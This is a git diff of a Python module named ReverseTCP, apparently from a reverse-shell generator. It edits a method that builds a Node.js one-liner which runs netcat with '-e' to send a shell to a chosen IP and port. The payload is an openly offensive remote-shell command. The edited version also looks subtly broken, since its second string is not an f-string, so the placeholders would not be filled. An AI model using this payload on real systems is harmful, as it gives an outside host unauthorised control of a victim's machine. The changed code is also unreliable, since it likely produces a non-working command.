@@ -25,5 +25,5 @@ class ReverseTCP(plugin.ReverseShell):
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
 
     def make_shell(self):
-        self.shell = f"""node -e "require('child_process').{self.args.exec}('nc -e {self.args.shell} {self.args.ip} {self.args.port}') """
-        self.shell += '"'
+        self.shell = f"""node -e "require('child_process').{self.args.exec}"""
+        self.shell += """('nc -e {self.args.shell} {self.args.ip} {self.args.port}') \""""
